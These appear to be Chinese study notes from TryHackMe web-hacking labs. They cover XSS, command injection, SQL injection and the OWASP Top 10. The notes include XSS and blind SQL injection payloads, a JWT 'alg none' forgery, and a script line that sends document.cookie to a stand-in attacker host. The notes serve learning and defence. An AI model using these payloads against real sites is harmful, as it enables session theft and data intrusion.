<p>进一步了解DOM 可以参考:<a target="_blank" rel="noopener" href="https://www.w3.org/">https://www.w3.org/</a></p>
<p>利用DOM：</p>
<p>DOM的xss是直接在浏览器中执行的 并不会将数据提交给后端</p>
<p><strong>如何测试基于 Dom 的 XSS：</strong></p>
<p>基于 DOM 的 XSS 可能具有挑战性，并且需要一定的 JavaScript 知识才能读取源代码。您需要查找访问攻击者可以控制的某些变量（例如“<strong>window.location.x</strong>”参数）的代码部分。</p>
<p>当你找到这些代码时，你需要看看它们是如何处理的，以及这些值是否曾经被写入网页的 DOM 或传递给不安全的 JavaScript 方法，如 <strong>eval（）。</strong></p>
<p>5.盲注xss</p>
<p>就是我们并不会从明面上收到xss执行成功的结果 查看执行结果需要借助其他的工具</p>
<p><a target="_blank" rel="noopener" href="https://github.com/mandatoryprogrammer/xsshunter-express">GitHub - mandatoryprogrammer/xsshunter-express: An easy-to-setup version of XSS Hunter. Sets up in five minutes and requires no maintenance!</a> </p>
<p>如何测试盲注XSS：</p>
<p>我们需要设置正确的payload 然后通过http等来返回结果 以此来查看是否执行成功  盲注xss和存储型xss差不多 </p>
<p>6.完善有效payload</p>
<p>要是有出现xss的地方 我们可以查看插入地方的页面源代码 根据标签来进行相关绕过</p>
<p>level 1:</p>
<p>最基本的payload即可</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;thm&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>script&gt;<br></code></pre></td></tr></table></figure>

<p>level2:</p>
<p>记得闭合</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;THM&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&lt;&quot;<br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072208714.png" srcset="/img/loading.gif" lazyload alt="image-20240307220828518"></p>
<p>level 3:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;THM&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>主要是有一个</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;textarea&gt;</span><br></code></pre></td></tr></table></figure>

<p> 把javascript代码当成普通文本了 然后我们通过把</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;textarea&gt;</span><br></code></pre></td></tr></table></figure>

<p>给闭合掉 就可以绕过这一点</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072223498.png" srcset="/img/loading.gif" lazyload alt="image-20240307222307327"></p>
<p>level 4:</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">&#x27;;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-symbol">&#x27;THM</span>&#x27;)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072234171.png" srcset="/img/loading.gif" lazyload alt="image-20240307223418032"></p>
<p>我们还是查看网页源代码 找相对应的点 然后闭合’; 后面的// 是为了把原本的给注释掉</p>
<p>levl 5:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ScIPt</span>&gt;</span>alert(&#x27;THM&#x27;)<span class="hljs-tag">&lt;/<span class="hljs-name">SciPt</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>这是把script给过滤了 </p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072240813.png" srcset="/img/loading.gif" lazyload alt="image-20240307224015727"></p>
<p>level 6:</p>
<p>这个的话是利用了img标签的其他属性</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/images/</span>cat.jpg<span class="hljs-string">&quot;onload=&quot;</span>alert(<span class="hljs-string">&#x27;THM&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072247655.png" srcset="/img/loading.gif" lazyload alt="image-20240307224756487"></p>
<p>然后thm给了一个 一个payload通关的：</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">jaVasCript:<span class="hljs-comment">/*-/*`/*\`/*&#x27;/*&quot;/**/</span>(<span class="hljs-comment">/* */</span>onerror=alert(<span class="hljs-string">&#x27;THM&#x27;</span>) )<span class="hljs-regexp">//%0D%0A%0d%0a//</span>&lt;<span class="hljs-regexp">/stYle/</span>&lt;<span class="hljs-regexp">/titLe/</span>&lt;<span class="hljs-regexp">/teXtarEa/</span>&lt;<span class="hljs-regexp">/scRipt/</span>--!&gt;<span class="hljs-string">\x3csVg/&lt;sVg/oNloAd=alert(&#x27;THM&#x27;)//&gt;\x3e</span><br></code></pre></td></tr></table></figure>

<p>7.盲打xss实例：</p>
<p>首先我们先注册一个账号 然后我们在</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072322533.png" srcset="/img/loading.gif" lazyload alt="image-20240307232232286"></p>
<p>这个地方进行xss</p>
<p>然后查看网页源代码的话 我们把<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072323320.png" srcset="/img/loading.gif" lazyload alt="image-20240307232331171"></p>
<p>这个给闭合掉 </p>
<p>所以payload为:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;THM&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>这仅仅是一个思路 然后我们可以通过监听来获取cookie的值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;<span class="hljs-regexp">/textarea&gt;&lt;script&gt;fetch(&#x27;https:/</span><span class="hljs-regexp">/hacker.thm:port?cookie=&#x27; + btoa(document.cookie));&lt;/</span>script&gt;   <br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403081021326.png" srcset="/img/loading.gif" lazyload alt="image-20240308102108056"></p>
<p>在本地的话 开启一个python的http服务 然后端口改成8000即可</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403081045437.png" srcset="/img/loading.gif" lazyload alt="image-20240308104554138"></p>
<p>(这个我做的时候有点小bug，session值不对)</p>
<h3 id="Command-Injection-命令注入"><a href="#Command-Injection-命令注入" class="headerlink" title="Command Injection(命令注入)"></a>Command Injection(命令注入)</h3><p>命令执行 分为两类:</p>
<p>1.有回显的rce</p>
<p>2.无回显的rce</p>
<p>可以结合sleep命令来进行，或者是利用重定向的符号，把结果打印到一个文件中  类似于cat /flag &gt; 1.txt 还可以利用curl进行dns外带</p>
<p>修复命令注入:</p>
<p>  方法:减少使用危险的函数，对用户输入进行严格过滤 通过waf进行防御</p>
<p>实例:</p>
<p>127.0.0.1;要执行的命令</p>
<h3 id="SQL-Injection-sql注入"><a href="#SQL-Injection-sql注入" class="headerlink" title="SQL Injection (sql注入)"></a>SQL Injection (sql注入)</h3><p>下面记录一些知识点:</p>
<p>select * from users limit 1; =&gt; 查询第一行的数据 </p>
<p>select * from users limit 1,1; 意思是跳过第一行，打印第二行</p>
<p>limit 2,1 就是跳过前两行，打印第三行</p>
<p>like % 进行匹配  </p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403082316313.png" srcset="/img/loading.gif" lazyload alt="image-20240308231602070"></p>
<p>;代表sql查询的结束</p>
<p>实践:</p>
<p>level1: 很常规的sql注入  (-2 union select 1,2,group_concat(id,username,password) from staff_users)</p>
<p>level2:万能密码登录</p>
<p>level3:  就是利用了like语句和盲注的特性，在本界面中存在的就返回true，否则就返回false  (布尔盲注)</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>首先我们先查询数据库  admin123<span class="hljs-string">&#x27; union select 1,2,3 where database() like &#x27;</span>a%<span class="hljs-string">&#x27;;--  通过爆破我们可以得到数据库的名字=&gt;sqli_three</span><br><span class="hljs-string"></span><br><span class="hljs-string">2.然后我们再去爆破表名 admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli_three&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">--  得到表的名字=&gt;users</span><br><br><span class="hljs-number">3.</span>接着是爆列名 admin123<span class="hljs-string">&#x27; union select 1,2,3 from information_schema.columns where table_schema=&#x27;</span>sqli_thre<span class="hljs-string">e&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27; and column_name like &#x27;</span>a%<span class="hljs-string">&#x27;;--  </span><br><span class="hljs-string">4. 列名有的不仅仅一个 然后我们得到一个之后就需要把这个给排除掉 </span><br><span class="hljs-string">admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli_three&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span>!=<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">-- </span><br><br><span class="hljs-number">5.</span>得到列名之后就是内容了 然后一样的思路 列名得到的是 (id,username,<span class="hljs-keyword">password</span>)<br>admin123<span class="hljs-string">&#x27; union select 1,2,3 from users where username like &#x27;</span>a%<span class="hljs-string">&#x27;;--</span><br><span class="hljs-string">admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">--</span><br>最终得到 <span class="hljs-keyword">admin</span> <span class="hljs-number">3845</span><br></code></pre></td></tr></table></figure>

<p>level4: (时间盲注)</p>
<p>跟布尔盲注的区别是，它并不会返回语句是否执行成功 然后有一个语句是延迟的 sleep() 我们可以通过这个来进行判断相关信息</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27; union select 1,sleep(5);-- //判断有两列 因为这样它会延迟5秒后返回界面</span><br><span class="hljs-string"></span><br><span class="hljs-string">2.剩下的步骤跟布尔盲注没什么区别 就是有了sleep来判断查询的数据是否存在</span><br><span class="hljs-string"></span><br><span class="hljs-string">3.admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">--</span><br><br>然后这一关用户名是<span class="hljs-keyword">admin</span> 密码的话仍然是<span class="hljs-number">4</span>位数字 需要自己去爆破<br></code></pre></td></tr></table></figure>

<p>到具体情况还得写脚本进行爆破，或者是利用burp进行爆破  </p>
<p>修复:</p>
<p>1.白名单，对于一些不允许输入的字符串进行一个替换</p>
<p>2.对用户输入的特殊字符进行转义处理</p>
<h2 id="Web-Hacking-Fundamentals"><a href="#Web-Hacking-Fundamentals" class="headerlink" title="Web Hacking Fundamentals"></a>Web Hacking Fundamentals</h2><h3 id="OWASP-Top-10-2021"><a href="#OWASP-Top-10-2021" class="headerlink" title="OWASP Top 10 - 2021"></a>OWASP Top 10 - 2021</h3><p>Broken Access Control</p>
<p>其实就是一个未授权访问</p>
<p>Broken Access Control (IDOR Challenge)</p>
<p>IDOR漏洞 可以访问其他用户的相关信息 可能会造成敏感信息的泄露 漏洞原因:应用程序没有对用户是否具有相关权限访问做出限制。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403122035395.png" srcset="/img/loading.gif" lazyload alt="image-20240312203542028"></p>
<p>Cryptographic Failures</p>
<p>简单的来讲就是用户和服务之间通信的加密不是那么的严格，容易被破解，从而导致信息的泄露。</p>
<p>在更复杂的级别上，利用某些加密故障通常涉及诸如“中间人攻击”之类的技术，攻击者会通过他们控制的设备强制用户连接。然后，他们将利用对任何传输数据的弱加密来访问截获的信息（如果数据首先被加密）。当然，许多示例要简单得多，并且可以在 Web 应用程序中找到漏洞，而无需高级网络知识即可利用这些漏洞。事实上，在某些情况下，敏感数据可以直接在 Web 服务器本身上找到。</p>
<p>Cryptographic Failures (Supporting Material 1)</p>
<p>有些数据库也可以存储为文件 被称为平面文件数据库 然后我们可以下载下来</p>
<p>具体操作:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>sqlite3 &lt;<span class="hljs-keyword">database</span>-<span class="hljs-type">name</span>&gt;<br><span class="hljs-number">2.</span> .<span class="hljs-keyword">tables</span>  //查看表名<br><span class="hljs-number">3.</span> PRAGMA table_info(<span class="hljs-built_in">table_name</span>); //可以出现列名<br><span class="hljs-number">4.</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-built_in">table_name</span>;    //查看表里面的内容<br></code></pre></td></tr></table></figure>

<p>有的时候我们得到的密码是一些经过nd5加密后的 然后我们需要去一些平台去解密</p>
<p><a target="_blank" rel="noopener" href="https://crackstation.net/">CrackStation - 在线密码哈希破解 - MD5、SHA1、Linux、Rainbow Tables 等</a></p>
<p>挑战:</p>
<p>在login网页源代码中发现信息 /assets</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131358159.png" srcset="/img/loading.gif" lazyload alt="image-20240313135757037"></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131359093.png" srcset="/img/loading.gif" lazyload alt="image-20240313135925920"></p>
<p>然后下载下来</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131403882.png" srcset="/img/loading.gif" lazyload alt="image-20240313140356643"></p>
<p>拿到了密码登录即可</p>
<p>Injection</p>
<p>简要概括了一下sql注入和命令注入。</p>
<ul>
<li><strong>SQL注入：</strong>当用户控制的输入传递给 SQL 查询时，会发生这种情况。因此，攻击者可以传入 SQL 查询来操纵此类查询的结果。当此输入传递到数据库查询时，攻击者可能会访问、修改和删除数据库中的信息。这意味着攻击者可以窃取敏感信息，例如个人详细信息和凭据。</li>
<li><strong>命令注入：</strong>当用户输入传递给系统命令时，会发生这种情况。因此，攻击者可以在应用程序服务器上执行任意系统命令，从而可能允许他们访问用户的系统。</li>
</ul>
<p>防止注入攻击的主要防御措施是确保用户控制的输入不会被解释为查询或命令。有不同的方法可以做到这一点：</p>
<ul>
<li><strong>使用允许列表：</strong>当输入发送到服务器时，此输入将与安全输入或字符列表进行比较。如果输入被标记为安全，则对其进行处理。否则，它将被拒绝，并且应用程序将引发错误。</li>
<li><strong>剥离输入：</strong> 如果输入包含危险字符，则在处理之前删除这些字符。</li>
</ul>
<p>实例:</p>
<p>反引号命令执行 </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-string">`cmd`</span><br></code></pre></td></tr></table></figure>

<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131913142.png" srcset="/img/loading.gif" lazyload alt="image-20240313191313732"></p>
<p>hgame2024某个题就是这样的</p>
<p>就有一个点:</p>
<p>在linux中sbin目录通常存放着系统管理员 可以在/etc/passwd中查看</p>
<p>Insecure Design</p>
<p>这个是在开发过程中，开发人员为了测试便捷，可能会有一些不安全的地方，然后在实际生产的环境中，忘记修改了导致一些漏洞的产生。</p>
<p>实例:</p>
<p>首先根据说明，先在忘记密码那里输入joseph用户</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132242159.png" srcset="/img/loading.gif" lazyload alt="image-20240313224235733"></p>
<p>然后有三个问题，我们选择第二个，这个容易进行猜测，试试红，蓝，白，绿等常见的颜色，最后发现是绿。</p>
<p>最后可以得到joseph用户的密码</p>
<ol start="5">
<li>Security Misconfiguration</li>
</ol>
<p>安全配置错误与其他前 10 大漏洞不同，因为它们发生在可以适当配置安全性但未正确配置的情况下。即使您下载了最新的软件，糟糕的配置也可能使您的安装容易受到攻击。</p>
<p>安全错误配置包括：</p>
<ul>
<li>对云服务（如 S3 存储桶）的权限配置不当。</li>
<li>启用不必要的功能，例如服务、页面、帐户或权限。</li>
<li>密码未更改的默认帐户。</li>
<li>错误消息过于详细，允许攻击者了解有关系统的更多信息。</li>
<li>不使用 <a target="_blank" rel="noopener" href="https://owasp.org/www-project-secure-headers/">HTTP 安全标头</a>。</li>
</ul>
<p>此漏洞通常会导致更多漏洞，例如允许您访问敏感数据的默认凭据、XML 外部实体 （XXE） 或管理页面上的命令注入。</p>
<p>还可能会导致一些ssti漏洞</p>
<p>实例:先访问/console 进入控制台，可以执行python命令 在ssti中有的是需要计算pin码，然后再进入控制台执行命令</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span>;<span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>).<span class="hljs-built_in">read</span>();<br></code></pre></td></tr></table></figure>



<ol start="6">
<li>Vulnerable and Outdated Components</li>
</ol>
<p>有时，您可能会发现您正在渗透测试的公司/实体正在使用具有已知漏洞的程序。</p>
<p>例如，假设一家公司已经有几年没有更新他们的 WordPress 版本了，使用 <a target="_blank" rel="noopener" href="https://wpscan.com/wordpress-security-scanner">WPScan</a> 等工具，您会发现它是 4.6 版。一些快速研究将揭示 WordPress 4.6 容易受到未经身份验证的远程代码执行 （RCE） 攻击，更好的是，您可以在 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41962">Exploit-DB</a> 上找到已经进行的漏洞利用。</p>
<p>Vulnerable and Outdated Components - Exploit</p>
<p>我们在知道该版本存在漏洞的情况下，下一步要做的就是去利用这个漏洞。 可以在exploit中寻找相关的漏洞信息。</p>
<p>实例:</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132343773.png" srcset="/img/loading.gif" lazyload alt="image-20240313234355495"></p>
<p>去exploit中搜索online book store </p>
<p>然后可以找到<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132344494.png" srcset="/img/loading.gif" lazyload alt="image-20240313234444214"></p>
<p>下载下来</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132348902.png" srcset="/img/loading.gif" lazyload alt="image-20240313234811766"></p>
<ol start="7">
<li>Identification and Authentication Failures</li>
</ol>
<p>主要介绍了身份验证的一些绕过。</p>
<p>1.弱口令</p>
<p>2.爆破</p>
<p>3.通过构造cookie进行登录</p>
<p>然后相关修复过程:</p>
<p>1.使用强密码 </p>
<p>2.对登录次数进行限制</p>
<p>3.实施多重身份验证</p>
<p>实例:</p>
<p>首先我们进去之后是一个登录框，然后当我们使用已经存在的用户去登录时，这个时候我们并不知道密码，所以我们可以去尝试重新注册该用户</p>
<p>如果注册成功，所拥有的权限是相同的。</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403141933290.png" srcset="/img/loading.gif" lazyload alt="image-20240314193314859"></p>
<p>注意在登录的时候前面也要添加空格。</p>
<p>8.Software and Data Integrity Failures</p>
<p>主要介绍了一些数据和和软件的完整性，通常我们在网上下载一个软件时，其开发者会设计一段经过hash加密过后的值 这是判断我们下载的数据是否被修改的一个重要评判。</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams">在linux中查看下载文件的md5值方法:<br><span class="hljs-function"><span class="hljs-title">md5sum</span></span> ......<br><br>sha1:<br><span class="hljs-function"><span class="hljs-title">sha1sum</span></span> ......<br><br>sha256:<br><span class="hljs-function"><span class="hljs-title">sha256sum</span></span>......<br></code></pre></td></tr></table></figure>



<p>Software Integrity Failures (软件完整性)</p>
<p>如果我们有一个网站，该网站使用第三方库，这些库存储在一些您无法控制的外部服务器中。比如说: jQuery </p>
<p>当用户去访问该网站时，浏览器将读取其HTML代码并从指定的外部源下载jQuery。现在如果攻击者攻击了jQery官方网站，并在里面插入了恶意的代码，每一个访问该网站的人都会中招。所以我们需要对这个js地址进行hash加密，这样只有两者的hash相同时，才能执行。</p>
<p>相关网站:<a target="_blank" rel="noopener" href="https://www.srihash.org/">SRI 哈希生成器 (srihash.org)</a></p>
<p>Data Integrity Failures(数据完整性)</p>
<p>当我们登录一个网站时，我们的账号信息会存储在cookie中，有的时候这些cookie会被修改，导致可以登录其他的用户，所以需要一些安全机制来保护它们不会被篡改。</p>
<p>其中一种实现方法就是<strong>JSON Web 令牌 （JWT）</strong></p>
<p>先来看看jwt的组成部分。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11c86acaea05f98045cec5634e03e997.png" srcset="/img/loading.gif" lazyload alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11c86acaea05f98045cec5634e03e997.png"></p>
<p>分为三部分，第一部分是header头，指示JWT的元数据，指明了使用什么签名算法。第二部分包含键值对，其中包含Web应用程序希望客户端存储的数据。第三部分是利用密钥进行加密后的值，这是保护的基础，只有我们知道密钥才能修改payload。</p>
<p>这三部分都是base64加密的，但是第三部分有二进制的数据，所以解密过后也查看不了有用的信息。</p>
<p>有防也有攻，下面是如何进行破解。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">1</span>.修改<span class="hljs-selector-tag">Header</span>头里面的alg为<span class="hljs-attribute">none</span> <br><span class="hljs-number">2</span>.删除签名部分，但是保留点<br></code></pre></td></tr></table></figure>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f5d1b4ef49ff4eef52e7617631225e8a.png" srcset="/img/loading.gif" lazyload alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f5d1b4ef49ff4eef52e7617631225e8a.png"></p>
<p>实例:</p>
<p>首先利用guest的身份进行登录，账号密码都是guest，但是得使用admin身份才能查看flag</p>
<p>cookie值如下:</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142051260.png" srcset="/img/loading.gif" lazyload alt="image-20240314205128142">  </p>
<p>然后按照上面的操作进行即可</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142056314.png" srcset="/img/loading.gif" lazyload alt="image-20240314205642031"></p>
<ol start="9">
<li>Security Logging and Monitoring Failures</li>
</ol>
<p>这主要介绍了日志文件的重要性，以及日志文件需要保存的内容</p>
<p>设置 Web 应用程序时，应记录用户执行的每个操作。日志记录很重要，因为在发生事件时，可以跟踪攻击者的活动。一旦他们的行为被追踪，就可以确定他们的风险和影响。如果没有日志记录，就无法判断攻击者在访问特定 Web 应用程序时执行了哪些操作。这些更显着的影响包括：</p>
<ul>
<li><strong>监管损害：</strong>如果攻击者获得了对个人身份用户信息的访问权限，并且没有这方面的记录，则最终用户会受到影响，并且应用程序所有者可能会受到罚款或更严厉的处罚，具体取决于法规。</li>
<li><strong>进一步攻击的风险：</strong>如果不进行日志记录，攻击者的存在可能无法检测到。这可能允许攻击者通过窃取凭据、攻击基础设施等方式对 Web 应用程序所有者发起进一步攻击。</li>
</ul>
<p>日志中存储的信息应包括以下内容：</p>
<ul>
<li>HTTP 状态代码</li>
<li>时间戳</li>
<li>用户名</li>
<li>API 端点/页面位置</li>
<li>IP 地址</li>
</ul>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142106579.png" srcset="/img/loading.gif" lazyload alt="image-20240314210621460"></p>
<p>这些日志包含一些敏感信息，因此请务必确保它们安全存储，并且这些日志的多个副本存储在不同的位置。</p>
<p>您可能已经注意到，在发生违规或事件后，日志记录更为重要。理想的情况是进行监控以检测任何可疑活动。检测此可疑活动的目的是完全阻止攻击者，或者在检测到攻击者的存在比预期晚得多时减少攻击者造成的影响。可疑活动的常见示例包括：</p>
<ul>
<li>多次未经授权尝试执行特定操作（通常是身份验证尝试或访问未经授权的资源，例如管理页面）</li>
<li>来自异常 IP 地址或位置的请求：虽然这可能表明其他人正在尝试访问特定用户的帐户，但它也可能具有误报率。</li>
<li>使用自动化工具：特定的自动化工具可以很容易地识别，例如使用User-Agent标头的值或请求的速度。这可能表明攻击者正在使用自动化工具。</li>
<li>常见有效负载：在 Web 应用程序中，攻击者通常使用已知有效负载。检测这些有效负载的使用可能表明存在对应用程序进行未经授权/恶意测试的人。</li>
</ul>
<p>仅仅检测可疑活动是没有帮助的。需要根据影响级别对这种可疑活动进行评级。例如，某些操作将比其他操作产生更大的影响。这些影响更大的行动需要尽快得到回应;因此，他们应该发出警报，以引起有关各方的注意。</p>
<p>实例:</p>
<p>分析日志可以知道</p>
<p>49.99.13.16是攻击ip，然后使用的攻击是暴力破解(Brute Force)</p>
<ol start="10">
<li>Server-Side Request Forgery (SSRF)</li>
</ol>
<p>ssrf 服务器端请求伪造，当攻击者可以强制 Web 应用程序代表他们向任意目标发送请求，同时控制请求本身的内容时，就会发生此类漏洞。SSRF 漏洞通常来自我们的 Web 应用程序需要使用第三方服务的实现。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png" srcset="/img/loading.gif" lazyload alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png"></p>
<p>ssrf的危害:</p>
<p>1.探测内网，探测那些我们不能访问的内容</p>
<p>2.与一些非http服务交互以获取远程代码执行</p>
<p>实例:</p>
<p>首先进入界面，观察一波 点击admin，发现只有本机地址(localhost)才能访问，有一个下载文件的点很可疑，访问看一下。</p>
